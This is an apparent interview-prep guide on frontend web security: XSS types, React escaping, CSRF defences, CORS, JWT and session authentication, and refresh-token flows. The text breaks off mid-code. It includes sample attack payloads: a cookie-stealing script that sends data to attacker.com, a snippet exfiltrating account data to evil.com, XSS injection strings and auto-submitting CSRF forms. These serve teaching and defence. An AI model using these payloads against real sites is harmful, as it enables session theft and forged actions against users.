# Frontend Security Interview Guide

A comprehensive guide covering essential frontend security concepts for technical interviews.

---

## Table of Contents

1. [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
2. [React XSS Protection](#react-xss-protection)
3. [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
4. [CORS vs CSRF](#cors-vs-csrf)
5. [Authentication Flows](#authentication-flows)
6. [Refresh Token Flow](#refresh-token-flow)
7. [Secure Cookie Flags](#secure-cookie-flags)
8. [Content Security Policy (CSP)](#content-security-policy-csp)
9. [Microservices Frontend Security](#microservices-frontend-security)

---

## XSS (Cross-Site Scripting)

### What is XSS?

XSS is a security vulnerability where attackers inject malicious scripts into web pages viewed by other users. When the victim's browser executes this script, it can steal cookies, session tokens, or perform actions on behalf of the user.

### Types of XSS

#### 1. Stored XSS (Persistent XSS)

**Description**: Malicious script is permanently stored on the target server (database, message forum, comment field).

**Attack Flow**:
```
1. Attacker submits malicious script to server
2. Server stores the script in database
3. Victim requests the page
4. Server sends stored malicious script
5. Victim's browser executes the script
```

**Example**:
```javascript
// Attacker submits a comment:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// When other users view comments, this script executes
```

**Real-world scenarios**:
- Blog comments
- User profiles
- Forum posts
- Product reviews

**Danger level**: HIGH - Affects all users who view the compromised content

---

#### 2. Reflected XSS (Non-Persistent XSS)

**Description**: Malicious script is reflected off a web server, such as in search results, error messages, or any response that includes user input.

**Attack Flow**:
```
1. Attacker crafts malicious URL with script
2. Victim clicks the link
3. Server reflects the script in response
4. Victim's browser executes the script
```

**Example**:
```javascript
// Vulnerable search functionality
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>

// Server responds with:
<h1>Search results for: <script>alert(document.cookie)</script></h1>

// Attacker sends phishing email with malicious link
```

**Real-world scenarios**:
- Search results
- Error messages
- URL parameters displayed on page
- Email verification links

**Danger level**: MEDIUM - Requires social engineering (victim must click link)

---

#### 3. DOM-Based XSS

**Description**: The vulnerability exists in client-side code rather than server-side. The malicious payload is executed as a result of modifying the DOM environment.

**Attack Flow**:
```
1. Victim's browser loads legitimate page
2. Client-side JavaScript processes malicious input
3. DOM is modified with malicious content
4. Browser executes the injected script
```

**Example**:
```javascript
// Vulnerable code:
const userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// Attack URL:
// https://example.com/#<img src=x onerror="alert(document.cookie)">

// Another example with eval:
const data = new URLSearchParams(window.location.search).get('callback');
eval(data); // Extremely dangerous!
```

**Common vulnerable sinks**:
- `innerHTML`
- `outerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` / `setInterval()` with string arguments
- `element.setAttribute()`

**Real-world scenarios**:
- Single Page Applications (SPAs)
- Client-side routing
- Dynamic content rendering
- Analytics tracking code

**Danger level**: MEDIUM-HIGH - Server may not detect the attack

---

### XSS Prevention Strategies

#### 1. Input Validation
```javascript
// Whitelist approach
function validateUsername(username) {
  const regex = /^[a-zA-Z0-9_]{3,20}$/;
  return regex.test(username);
}
```

#### 2. Output Encoding
```javascript
// HTML entity encoding
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

#### 3. Use Safe APIs
```javascript
// Safe: textContent
element.textContent = userInput;

// Unsafe: innerHTML
element.innerHTML = userInput; // DON'T DO THIS
```

#### 4. Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## React XSS Protection

### How React Prevents XSS

#### 1. Automatic Escaping by Default

React automatically escapes all values rendered in JSX, converting special characters to their HTML entity equivalents.

```jsx
// Safe - React escapes the content
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;
// Renders as: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

#### 2. JSX Prevents Injection

JSX syntax ensures that embedded expressions are treated as data, not code.

```jsx
// Safe
const title = response.potentiallyMaliciousInput;
return <h1>{title}</h1>;
```

---

### When React Doesn't Protect You

#### 1. dangerouslySetInnerHTML

**Dangerous**:
```jsx
// UNSAFE - directly renders HTML
function UserComment({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
```

**Safe Alternative**:
```jsx
// Use a sanitization library
import DOMPurify from 'dompurify';

function UserComment({ comment }) {
  const sanitized = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

#### 2. href with javascript: Protocol

**Dangerous**:
```jsx
// UNSAFE
const userUrl = "javascript:alert('XSS')";
return <a href={userUrl}>Click me</a>;
```

**Safe**:
```jsx
// Validate URL scheme
function SafeLink({ href, children }) {
  const isSafe = href.startsWith('http://') || href.startsWith('https://');
  
  return isSafe ? (
    <a href={href}>{children}</a>
  ) : (
    <span>{children}</span>
  );
}
```

#### 3. User-Provided Event Handlers

**Dangerous**:
```jsx
// UNSAFE - don't accept event handlers from user input
const userProps = JSON.parse(userInput);
return <div {...userProps} />;
```

#### 4. Server-Side Rendering with User Data

**Dangerous**:
```jsx
// UNSAFE
const html = `
  <script>
    window.__INITIAL_DATA__ = ${JSON.stringify(userData)};
  </script>
`;
```

**Safe**:
```jsx
// Properly escape for script context
const html = `
  <script>
    window.__INITIAL_DATA__ = ${JSON.stringify(userData)
      .replace(/</g, '\\u003c')
      .replace(/>/g, '\\u003e')};
  </script>
`;
```

#### 5. Direct DOM Manipulation

**Dangerous**:
```jsx
useEffect(() => {
  // UNSAFE - bypasses React's protection
  document.getElementById('output').innerHTML = userContent;
}, [userContent]);
```

---

### React Security Best Practices

```jsx
// 1. Always validate and sanitize user input
import DOMPurify from 'dompurify';

function SafeContent({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 2. Use allowlist for URLs
const SAFE_URL_PATTERN = /^(?:https?:)?\/\//;

function SafeLink({ url, children }) {
  const isValid = SAFE_URL_PATTERN.test(url);
  return isValid ? <a href={url}>{children}</a> : <span>{children}</span>;
}

// 3. Sanitize data before storing in state
function useUserInput() {
  const [input, setInput] = useState('');
  
  const handleInput = (value) => {
    const sanitized = DOMPurify.sanitize(value);
    setInput(sanitized);
  };
  
  return [input, handleInput];
}
```

---

## CSRF (Cross-Site Request Forgery)

### What is CSRF?

CSRF is an attack that forces authenticated users to execute unwanted actions on a web application where they're currently authenticated. The attacker tricks the victim's browser into making a request to a vulnerable site.

### How CSRF Works

```
1. User logs into legitimate-bank.com
2. User visits malicious-site.com (in another tab)
3. Malicious site contains:
   <form action="https://legitimate-bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker-account">
   </form>
   <script>document.forms[0].submit();</script>
4. Browser automatically includes cookies with the request
5. Bank processes the transfer (user is authenticated)
```

### CSRF Attack Examples

#### Example 1: Bank Transfer
```html
<!-- Attacker's website -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

#### Example 2: State-Changing GET Request
```html
<img src="https://example.com/api/delete-account" />
```

#### Example 3: POST Request via Hidden Form
```html
<form id="csrf" action="https://example.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
```

---

### CSRF Protection Mechanisms

#### 1. CSRF Tokens (Synchronizer Token Pattern)

**How it works**:
- Server generates unique token for each session/request
- Token is embedded in forms or stored in client
- Server validates token on state-changing requests

**Implementation**:

```javascript
// Backend (Node.js/Express)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/submit', csrfProtection, (req, res) => {
  // Token is automatically validated
  res.send('Success');
});

// Frontend (React)
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    // Fetch CSRF token on component mount
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.token));
  }, []);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ amount: 100, to: 'account123' })
    });
  };
  
  return <form onSubmit={handleSubmit}>...</form>;
}
```

#### 2. SameSite Cookie Attribute

**Most effective modern protection**:

```javascript
// Backend
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // or 'lax' or 'none'
});
```

**SameSite values**:
- `Strict`: Cookie never sent on cross-site requests
- `Lax`: Cookie sent on top-level navigation (GET requests, clicking links)
- `None`: Cookie sent on all requests (requires Secure flag)

```javascript
// Strict - Most secure
sameSite: 'strict'
// ✓ user navigates to example.com directly
// ✗ user clicks link from another site
// ✗ form POST from another site
// ✗ image/iframe from another site

// Lax - Balanced (recommended)
sameSite: 'lax'
// ✓ user navigates to example.com directly
// ✓ user clicks link from another site
// ✗ form POST from another site
// ✗ image/iframe from another site

// None - Least secure (use only when necessary)
sameSite: 'none', secure: true
// ✓ all scenarios (requires HTTPS)
```

#### 3. Double Submit Cookie Pattern

```javascript
// Backend generates random token
const csrfToken = crypto.randomBytes(32).toString('hex');

// Send as both cookie and response body
res.cookie('csrf-token', csrfToken, { 
  httpOnly: false, // Client needs to read it
  sameSite: 'strict' 
});
res.json({ csrfToken });

// Frontend includes token in header
fetch('/api/action', {
  headers: {
    'X-CSRF-Token': getCookie('csrf-token')
  }
});

// Backend verifies cookie matches header
if (req.cookies['csrf-token'] !== req.headers['x-csrf-token']) {
  return res.status(403).send('Invalid CSRF token');
}
```

#### 4. Custom Request Headers

```javascript
// Frontend (React with Axios)
axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

// Backend verification
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
  return res.status(403).send('Forbidden');
}
```

**Why this works**: Cross-origin requests cannot set custom headers unless CORS is configured (which you control).

#### 5. Origin/Referer Header Validation

```javascript
// Backend validation
function validateOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com'];
  
  if (!origin || !allowedOrigins.includes(new URL(origin).origin)) {
    return res.status(403).send('Invalid origin');
  }
  
  next();
}

app.post('/api/*', validateOrigin);
```

---

### Complete CSRF Protection Strategy

```javascript
// Recommended multi-layer approach:

// 1. Use SameSite cookies
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax' // or 'strict' for high security
});

// 2. Add CSRF tokens for sensitive operations
// 3. Validate Origin/Referer headers
// 4. Use custom headers for AJAX requests
// 5. Require re-authentication for critical actions
```

---

## CORS vs CSRF

### Comparison Table

| Aspect | CORS | CSRF |
|--------|------|------|
| **Purpose** | Controls cross-origin resource sharing | Prevents unauthorized actions via user's credentials |
| **What it protects** | Server resources from unauthorized origins | User actions from malicious sites |
| **Who configures** | Server (response headers) | Server (various mechanisms) |
| **Attack vector** | Reading cross-origin responses | Making state-changing requests |
| **Browser role** | Enforces same-origin policy | Automatically includes cookies |

---

### CORS (Cross-Origin Resource Sharing)

**Purpose**: Allows servers to specify which origins can access their resources.

**Problem it solves**:
```javascript
// Without CORS, this fails due to Same-Origin Policy:
// Page at https://frontend.com tries to fetch:
fetch('https://api.backend.com/data')
// Browser blocks the response
```

**How CORS works**:

```javascript
// 1. Browser sends preflight request (for non-simple requests)
OPTIONS /api/data HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

// 2. Server responds with allowed origins
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true

// 3. Browser allows the actual request
```

**CORS Configuration Examples**:

```javascript
// Express.js
const cors = require('cors');

// Allow specific origin
app.use(cors({
  origin: 'https://frontend.com',
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Dynamic origin validation
app.use(cors({
  origin: function(origin, callback) {
    const allowedOrigins = ['https://app1.com', 'https://app2.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

---

### CSRF (Cross-Site Request Forgery)

**Purpose**: Prevents unauthorized actions using victim's credentials.

**Problem it solves**:
```javascript
// Malicious site tricks browser into making authenticated request:
// User is logged into bank.com
// Visits evil.com which contains:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
// Browser includes bank.com cookies automatically!
```

**CSRF Protection**:
```javascript
// 1. CSRF Token
app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid token');
  }
  // Process transfer
});

// 2. SameSite Cookies
res.cookie('session', value, { sameSite: 'strict' });
```

---

### Key Differences Illustrated

#### Scenario 1: CORS Attack (prevented by CORS)
```javascript
// evil.com tries to read user's data from bank.com
fetch('https://bank.com/api/account')
  .then(r => r.json())
  .then(data => {
    // Send data to attacker
    fetch('https://evil.com/steal', { 
      method: 'POST', 
      body: JSON.stringify(data) 
    });
  });

// Result: Browser blocks reading the response (CORS violation)
// Even though request is sent, evil.com cannot read the response
```

#### Scenario 2: CSRF Attack (prevented by CSRF protection)
```javascript
// evil.com tricks user into performing action on bank.com
// <form> on evil.com submits to bank.com
// Attacker doesn't need to read the response
// Just needs the action to be executed

// Result: Without CSRF protection, request succeeds
// With CSRF protection (token/SameSite), request fails
```

---

### When You Need Both

```javascript
// Modern web application setup:

// Frontend (https://app.example.com)
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include', // Include cookies
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken // CSRF protection
  },
  body: JSON.stringify({ data: 'value' })
});

// Backend (https://api.example.com)
app.use(cors({
  origin: 'https://app.example.com', // CORS: control who can call API
  credentials: true
}));

app.use(csrfProtection); // CSRF: validate requests are legitimate

app.post('/data', (req, res) => {
  // Both protections active:
  // - CORS ensures only app.example.com can read responses
  // - CSRF ensures requests are from real user actions
  res.json({ success: true });
});
```

---

### Common Misconceptions

❌ **"CORS prevents CSRF"**
- CORS only prevents *reading* responses
- Doesn't prevent state-changing requests

❌ **"CSRF tokens prevent CORS issues"**
- CSRF tokens don't affect cross-origin access
- CORS is a browser security policy

✅ **Reality**:
- Use CORS to control who can access your API
- Use CSRF to ensure requests come from your application

---

## Authentication Flows

### JWT (JSON Web Tokens) Authentication

#### How JWT Works

```javascript
// JWT Structure: header.payload.signature
// Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJleHAiOjE2MzI1NTUyMDB9.abc123signature

// 1. Header (Base64 encoded)
{
  "alg": "HS256",
  "typ": "JWT"
}

// 2. Payload (Base64 encoded)
{
  "userId": "123",
  "email": "user@example.com",
  "exp": 1632555200, // Expiration timestamp
  "iat": 1632551600  // Issued at
}

// 3. Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

#### JWT Authentication Flow

```javascript
// 1. Login - Backend generates JWT
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Verify credentials
  const user = await User.findOne({ email });
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate JWT
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '15m' } // Short-lived token
  );
  
  res.json({ token });
});

// 2. Frontend stores token
function Login() {
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  
  const handleLogin = async (e) => {
    e.preventDefault();
    
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    });
    
    const { token } = await response.json();
    
    // Store in localStorage (or better: memory/state management)
    localStorage.setItem('token', token);
  };
  
  return <form onSubmit={handleLogin}>...</form>;
}

// 3. Frontend sends token with requests
const api = axios.create();

api.interceptors.request.use(config => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 4. Backend validates token
function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.split(' ')[1]; // Bearer TOKEN
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid token' });
  }
}

app.get('/protected', authenticateJWT, (req, res) => {
  res.json({ data: 'Protected data', user: req.user });
});
```

---

### Session-Based Authentication

#### How Sessions Work

```javascript
// 1. Login - Backend creates session
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // No JavaScript access
    sameSite: 'lax',
    maxAge: 1000 * 60 * 60 * 24 // 24 hours
  },
  store: new RedisStore({ client: redisClient }) // Use Redis for production
}));

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await User.findOne({ email });
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Store user info in session
  req.session.userId = user.id;
  req.session.email = user.email;
  
  res.json({ message: 'Login successful' });
});

// 2. Frontend makes requests (cookies sent automatically)
function Dashboard() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // No need to manually include credentials - cookies sent automatically
    fetch('/api/dashboard', {
      credentials: 'include' // Important for cross-origin requests
    })
      .then(r => r.json())
      .then(setData);
  }, []);
  
  return <div>{JSON.stringify(data)}</div>;
}

// 3. Backend validates session
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  next();
}

app.get('/dashboard', requireAuth, async (req, res) => {
  const user = await User.findById(req.session.userId);
  res.json({ user });
});

// 4. Logout
app.post('/logout', (req, res) => {
  req.session.destroy(err => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid'); // Clear session cookie
    res.json({ message: 'Logged out' });
  });
});
```

---

### JWT vs Session Comparison

| Feature | JWT | Session |
|---------|-----|---------|
| **Storage** | Client-side (localStorage/memory) | Server-side (memory/database/Redis) |
| **Scalability** | Stateless - easy to scale | Stateful - requires session store synchronization |
| **Size** | Larger (sent with every request) | Smaller (only session ID in cookie) |
| **Revocation** | Difficult (need blacklist) | Easy (delete from store) |
| **Security** | Vulnerable if stored in localStorage | More secure (HttpOnly cookies) |
| **Cross-domain** | Easy (include in headers) | Requires CORS configuration |
| **Expiration** | Self-contained expiry | Server-controlled |
| **Best for** | APIs, microservices, mobile apps | Traditional web applications |

---

### Secure JWT Implementation

```javascript
// DON'T: Store JWT in localStorage (XSS vulnerable)
localStorage.setItem('token', jwt);

// DO: Store in httpOnly cookie or memory
// Backend
res.cookie('token', jwt, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000 // 15 minutes
});

// Frontend - token automatically included in requests
fetch('/api/data', {
  credentials: 'include'
});

// Or use memory storage with state management
const AuthContext = createContext();

function AuthProvider({ children }) {
  const [token, setToken] = useState(null);
  
  // Token only exists in memory, lost on refresh
  // Implement refresh token flow to persist login
  
  return (
    <AuthContext.Provider value={{ token, setToken }}>
      {children}
    </AuthContext.Provider>
  );
}
```

---

### Secure Session Implementation

```javascript
// Production-ready session configuration
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
  password: process.env.REDIS_PASSWORD
});

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong random string
  name: 'sessionId', // Don't use default 'connect.sid'
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // Prevent XSS
    sameSite: 'strict', // Prevent CSRF
    maxAge: 1000 * 60 * 60 * 24, // 24 hours
    domain: process.env.COOKIE_DOMAIN // Restrict domain
  },
  // Session regeneration on login
  rolling: true // Reset expiry on activity
}));

// Regenerate session on login to prevent session fixation
app.post('/login', (req, res) => {
  const oldSessionId = req.session.id;
  
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Login failed' });
    
    req.session.userId = user.id;
    res.json({ message: 'Login successful' });
  });
});
```

---

## Refresh Token Flow

### Why Refresh Tokens?

**Problem**: 
- Short-lived access tokens (15 min) expire frequently
- Long-lived tokens are security risk if stolen
- Re-authenticating constantly is bad UX

**Solution**: Refresh token flow
- Access token: Short-lived (15 min), used for API requests
- Refresh token: Long-lived (7 days), used only to get new access tokens

---

### Refresh Token Architecture

```
┌─────────────┐                    ┌─────────────┐
│   Client    │                    │   Server    │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Login (credentials)          │
       ├─────────────────────────────────>│
       │                                  │ Verify credentials
       │  2. Access + Refresh tokens      │ Generate tokens
       │<─────────────────────────────────┤
       │                                  │
       │  3. API request (access token)   │
       ├─────────────────────────────────>│
       │                                  │ Verify access token
       │  4. Protected data               │
       │<─────────────────────────────────┤
       │                                  │
       │  [Access token expires]          │
       │                                  │
       │  5. API request (expired token)  │
       ├─────────────────────────────────>│
       │                                  │ Token expired
       │  6. 401 Unauthorized             │
       │<─────────────────────────────────┤
       │                                  │
       │  7. Refresh (refresh token)      │
       ├─────────────────────────────────>│
       │                                  │ Verify refresh token
       │  8. New access token             │ Generate new access token
       │<─────────────────────────────────┤
       │                                  │
       │  9. Retry request (new token)    │
       ├─────────────────────────────────>│
       │                                  │
       │  10. Protected data              │
       │<─────────────────────────────────┤
       │                                  │
```

---

### Implementation

#### Backend: Generate Tokens

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Token generation
function generateTokens(user) {
  // Access token: Short-lived, contains user info
  const accessToken = jwt.sign(
    { 
      userId: user.id,
      email: user.email,
      type: 'access'
    },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // 15 minutes
  );
  
  // Refresh token: Long-lived, opaque identifier
  const refreshToken = jwt.sign(
    {
      userId: user.id,
      type: 'refresh',
      tokenId: crypto.randomBytes(16).toString('hex') // Unique ID for revocation
    },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // 7 days
  );
  
  return { accessToken, refreshToken };
}

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Verify credentials
  const user = await User.findOne({ email });
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate tokens
  const { accessToken, refreshToken } = generateTokens(user);
  
  // Store refresh token in database for revocation
  await RefreshToken.create({
    token: refreshToken,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });
  
  // Send tokens
  // Option 1: Both in httpOnly cookies (most secure)
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000 // 15 minutes
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/api/auth/refresh' // Only sent to refresh endpoint
  });
  
  res.json({ message: 'Login successful' });
  
  // Option 2: Return in response body (for mobile/SPA)
  // Store refresh token securely on client
  // res.json({ accessToken, refreshToken });
});
```

#### Backend: Refresh Endpoint

```javascript
app.post('/api/auth/refresh', async (req, res) => {
  // Get refresh token from cookie or body
  const refreshToken = req.cookies.refreshToken || req.body.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
    // Check if token exists in database (not revoked)
    const tokenDoc = await RefreshToken.findOne({ 
      token: refreshToken,
      userId: decoded.userId 
    });
    
    if (!tokenDoc) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }
    
    // Check if token is expired
    if (new Date() > tokenDoc.expiresAt) {
      await RefreshToken.deleteOne({ _id: tokenDoc._id });
      return res.status(403).json({ error: 'Refresh token expired' });
    }
    
    // Generate new access token
    const user = await User.findById(decoded.userId);
    const accessToken = jwt.sign(
      { 
        userId: user.id,
        email: user.email,
        type: 'access'
      },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    // Optionally rotate refresh token (more secure)
    const newRefreshToken = jwt.sign(
      {
        userId: user.id,
        type: 'refresh',
        tokenId: crypto.randomBytes(16).toString('hex')
      },
      process.env.REFRESH_TOKEN_SECRET,
      { expiresIn: '7d' }
    );
    
    // Update database
    await RefreshToken.deleteOne({ _id: tokenDoc._id });
    await RefreshToken.create({
      token: newRefreshToken,
      userId: user.id,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });
    
    // Send new tokens
    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
      path: '/api/auth/refresh'
    });
    
    res.json({ message: 'Token refreshed' });
    
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

#### Backend: Protect Routes

```javascript
function authenticateAccessToken(req, res, next) {
  const token = req.cookies.accessToken || 
                req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No access token' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET);
    
    if (decoded.type !== 'access') {
      return res.status(403).json({ error: 'Invalid token type' });
    }
    
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ 
        error: 'Token expired',
        code: 'TOKEN_EXPIRED' // Client can use this to trigger refresh
      });
    }
    return res.status(403).json({ error: 'Invalid token' });
  }
}

app.get('/api/protected', authenticateAccessToken, (req, res) => {
  res.json({ data: 'Protected data', user: req.user });
});
```

---

### Frontend: React Implementation

```javascript
// API client with automatic token refresh
import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true // Include cookies
});

let isRefreshing = false;
let refreshSubscribers = [];

function subscribeTokenRefresh(callback) {
  refreshSubscribers.push(callback);
}

function onTokenRefreshed() {
  refreshSubscribers.forEach(callback => callback());
  refreshSubscribers = [];
}

// Response interceptor: handle token expiration
api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // If access token expired
    if (error.response?.status === 401 && 
        error.response?.data?.code === 'TOKEN_EXPIRED' &&
        !originalRequest._retry) {
      
      if (isRefreshing) {
        // Wait for refresh to complete
        return new Promise(resolve => {
          subscribeTokenRefresh(() => {
            resolve(api(originalRequest));
          });
        });
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        // Refresh token
        await axios.post('/api/auth/refresh', {}, { 
          withCredentials: true 
        });
        
        isRefreshing = false;
        onTokenRefreshed();
        
        // Retry original request
        return api(originalRequest);
        
      } catch (refreshError) {
        isRefreshing = false;
        // Refresh failed - redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);

// React hook for authentication
function useAuth() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check if user is authenticated on mount
    api.get('/auth/me')
      .then(response => setUser(response.data.user))
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);
  
  const login = async (email, password) => {
    const response = await api.post('/auth/login', { email, password });
    setUser(response.data.user);
  };
  
  const logout = async () => {
    await api.post('/auth/logout');
    setUser(null);
  };
  
  return { user, loading, login, logout };
}

// Usage in components
function Dashboard() {
  const { user, loading } = useAuth();
  const [data, setData] = useState(null);
  
  useEffect(() => {
    if (user) {
      // This automatically handles token refresh
      api.get('/dashboard/data')
        .then(response => setData(response.data))
        .catch(error => console.error(error));
    }
  }, [user]);
  
  if (loading) return <div>Loading...</div>;
  if (!user) return <Navigate to="/login" />;
  
  return <div>{JSON.stringify(data)}</div>;
}
```

---

### Token Storage Best Practices

```javascript
// ❌ DON'T: Store tokens in localStorage (vulnerable to XSS)
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', token);

// ❌ DON'T: Store refresh token in memory (lost on refresh)
const [accessToken, setAccessToken] = useState(token);

// ✅ DO: Store in httpOnly cookies (protected from XSS)
// Backend sets cookies automatically
res.cookie('accessToken', token, { httpOnly: true, secure: true });
res.cookie('refreshToken', token, { httpOnly: true, secure: true });

// ✅ DO: For mobile apps, use secure storage
// React Native: use react-native-keychain
import * as Keychain from 'react-native-keychain';

await Keychain.setGenericPassword('refreshToken', token, {
  service: 'com.myapp.refreshtoken',
  accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED
});

// ✅ DO: For SPAs without cookies, store access token in memory
// Store refresh token in httpOnly cookie only
const AuthContext = createContext();

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState(null);
  
  // Access token in memory, lost on refresh
  // Refresh token in httpOnly cookie, used to get new access token
  
  return (
